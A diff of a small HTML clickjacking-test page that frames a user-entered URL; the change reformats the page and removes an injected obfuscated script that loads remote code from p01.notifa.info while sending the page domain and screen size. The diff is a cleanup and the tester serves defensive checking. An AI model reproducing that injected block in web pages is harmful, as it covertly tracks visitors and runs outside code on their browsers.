@@ -1,36 +1,33 @@
-
 <html>
-    <head>
-        <title>Nakanosec - Online Clickjacking Test</title>
-        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
-    </head>
-    <body>
-        <div class="container">
-            <div class="h1">Test Clickjacking Vulnerability - Nakanosec</div>
-            <div class="form-group">
-                <label for="URL">URL:</label>
-                <input type="url" id="url" class="form-control" placeholder="http://sites.com"/>
-                <small id="textHelp" class="form-text text-muted">Add http:// or https:// in the beginning</small>
-            </div>
-            <button id="submit-test" class="btn btn-primary">Test it!</button>
-            <iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="about:blank" rel="noopener" rel="noreferrer"  id="iframe" frameborder="1" width="100%" height="100%"></iframe>
-        </div>
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXf9xe2F7dEFr0A%2bLgbIrLq6Wem7VYbjjsAGPXKOYjpQ75ZLYBfmeZX4sTt095khw2TS1C75Su9TqmsWanZPsX3wnz0c2u1fTXlGMm2quRzFijsp7JEg09ZE3ygikjIXijX6sWfGJaqHqZ%2bsEkAgqhUeAGnxTE2ITMFxzjliDKfXCMijiCv4HkIykFm8HN6ENxJQ6sz2s6N4NHCFGibmQxkHU%2bHlBrm0ojHHfBMJEddKcDZnwyQjldEm2Lpi%2fbWW3rAg0LE0fU26qBg1ytUromu6DK20hh2kWw1DLLbS4JKdznRGN9YtN%2bx2TbbdleyAGapiwM8tNxvxrGtvnq2cyjBHID7vvP94kJTF48hdb4ewrvwDqown94vKooBauMbK71PLDjZQgpClbTZ9pF2Zl2b6ZYYfIFc%2b1WxnqBkPNm%2bIdugGx2vi6iDrk%2boW8KRWNVlckzuio1aFReo2pArEUFscCFvVmguKvXuFijpW5WxusEaPhyjtcSr285ycqR%2b1psf75ouKq%2fdmfQR8jJJonsv3kRHQI3vjSRpjwYaWCSKIwim8GWXjTw3225hwzOnGbftN9DYmOj8MtfbEMM1Dzjcg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+  <head>
+    <title>Nakanosec - Online Clickjacking Test</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+  </head>
+  <body>
+    <div class="container">
+      <div class="h1">Test Clickjacking Vulnerability - Nakanosec</div>
+      <div class="form-group">
+        <label for="URL">URL:</label>
+        <input type="url" id="url" class="form-control" placeholder="http://sites.com" />
+        <small id="textHelp" class="form-text text-muted">Add http:// or https:// in the beginning</small>
+      </div>
+      <button id="submit-test" class="btn btn-primary">Test it!</button>
+      <iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="about:blank" rel="noopener" rel="noreferrer" id="iframe" frameborder="1" width="100%" height="100%"></iframe>
+    </div>
     <script>
-        function frameIt() {
-           var url = document.getElementById("url").value;
-           var iframe = document.getElementById("iframe");
-           iframe.src = url;
-        } 
-        document.addEventListener('DOMContentLoaded', function () {
-           document.getElementById('submit-test').addEventListener('click',
-               function() {
-                  frameIt();
-               }
-           );
+      function frameIt() {
+        var url = document.getElementById("url").value;
+        var iframe = document.getElementById("iframe");
+        iframe.src = url;
+      }
+      document.addEventListener("DOMContentLoaded", function () {
+        document.getElementById("submit-test").addEventListener("click", function (e) {
+          e.preventDefault();
+          frameIt();
         });
+      });
     </script>
+  </body>
 </html>
-
